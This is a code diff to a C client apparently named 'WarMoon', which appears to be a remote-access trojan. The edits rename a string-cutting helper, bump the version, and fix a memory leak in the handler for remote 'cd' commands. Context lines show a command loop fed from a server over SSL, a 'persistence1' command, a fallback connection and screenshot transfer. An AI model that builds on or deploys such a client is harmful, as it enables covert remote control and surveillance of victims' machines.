@@ -83,9 +83,9 @@ unsigned int GetUnixTime() //Now each screenshot that will be taken and transfer
 	return GetTime;
 }
 
-char *str_cut(char str[], int slice_from, int slice_to)
+char *StrCut(char String[], int SliceFrom, int SliceTo)
 {
-	if (str[0] == '\0')
+	if (String[0] == '\0')
 	{
 		return NULL;
 	}
@@ -93,33 +93,33 @@ char *str_cut(char str[], int slice_from, int slice_to)
 	char *Buffer;
 	size_t StrLen, BufferLen;
 
-	if (slice_to < 0 && slice_from > slice_to)
+	if (SliceTo < 0 && SliceFrom > SliceTo)
 	{
-		StrLen = strlen(str);
-		if (abs(slice_to) > StrLen -1)
+		StrLen = strlen(String);
+		if (abs(SliceTo) > StrLen -1)
 		{
 			return NULL;
 		}
 
-		if (abs(slice_from) > StrLen)
+		if (abs(SliceFrom) > StrLen)
 		{
-			slice_from = (-1) * StrLen;
+			SliceFrom = (-1) * StrLen;
 		}
 
-		BufferLen = slice_to - slice_from;
-		str += (StrLen + slice_from);
+		BufferLen = SliceTo - SliceFrom;
+		String += (StrLen + SliceFrom);
 	}
-	else if (slice_from >= 0 && slice_to > slice_from)
+	else if (SliceFrom >= 0 && SliceTo > SliceFrom)
 	{
-		StrLen = strlen(str);
+		StrLen = strlen(String);
 
-		if (slice_from > StrLen -1)
+		if (SliceFrom > StrLen -1)
 		{
 			return NULL;
 		}
 
-		BufferLen = slice_to - slice_from;
-		str += slice_from;
+		BufferLen = SliceTo - SliceFrom;
+		String += SliceFrom;
 	}
 
 	else
@@ -128,7 +128,7 @@ char *str_cut(char str[], int slice_from, int slice_to)
 	}
 
 	Buffer = calloc(BufferLen, sizeof(char));
-	strncpy(Buffer, str, BufferLen);
+	strncpy(Buffer, String, BufferLen);
 	return Buffer;
 }
 
@@ -219,7 +219,7 @@ DWORD FallBackConnection(LPVOID Parameter)
 
 DWORD PopupMSGBox(LPVOID Parameter)
 {
-	MessageBoxW(NULL, L"WarMoon Client Active!", L"WarMoon V_3.1", MB_OK);
+	MessageBoxW(NULL, L"WarMoon Client Active!", L"WarMoon V_3.2", MB_OK);
 	return 0;
 }
 
@@ -316,7 +316,10 @@ void Run(SSL_CTX *Context, char *NewServerIP)
 
 		else if (strncmp(ReceiveBuffer, "cd ", 3) == 0)
 		{
-			chdir(str_cut(ReceiveBuffer, 3, 100));
+			char *ChangeDirPath = StrCut(ReceiveBuffer, 3, 100);
+			chdir(ChangeDirPath);
+			free(ChangeDirPath);
+			ChangeDirPath = NULL;
 		}
 
 		else if (strncmp(ReceiveBuffer, "persistence1", 12) == 0)
